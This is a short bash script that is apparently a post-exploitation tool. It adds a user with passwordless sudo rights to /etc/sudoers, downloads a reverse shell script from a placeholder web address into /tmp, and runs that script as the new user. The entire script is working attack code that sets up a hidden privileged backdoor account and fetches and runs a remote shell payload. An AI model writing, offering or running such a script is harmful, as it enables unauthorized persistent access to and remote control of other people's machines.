#!/bin/bash

# Define variables
NEW_USER="newuser"
REVSHELL_URL="https://your-github-pages-url/revshell.sh"

# Create a new user with no password and add it to sudoers (for elevated privileges)
useradd -m $NEW_USER
echo "$NEW_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

# Download the reverse shell script
wget $REVSHELL_URL -O /tmp/revshell.sh

# Make it executable
chmod +x /tmp/revshell.sh

# Switch to the new user and run the reverse shell script
sudo -u $NEW_USER /tmp/revshell.sh
